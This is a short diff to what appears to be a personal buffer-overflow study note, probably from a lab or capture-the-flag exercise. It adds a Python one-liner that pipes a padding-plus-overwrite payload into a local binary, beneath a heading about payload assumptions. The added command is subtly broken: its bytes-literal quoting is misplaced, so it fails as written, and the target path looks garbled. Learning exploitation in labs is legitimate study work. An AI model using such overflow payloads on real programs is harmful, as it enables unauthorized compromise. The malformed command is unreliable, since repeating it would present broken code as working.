@@ -192,6 +192,7 @@ As long as you use `b''` prefix and stick to printable ASCII characters — you 
 
 ![[Pasted image 20260622130007.png]]
 
+python -c "import sys; sys.stdout.buffer.write(b'\x41*2096 + b'\x01\x00\x00\x00')" |  /.sun
 ### Assumptions when drafting the paylaod
 1. When  you request 128 in the buffer , but there is no guarantee that gcc would give you 128. 
 
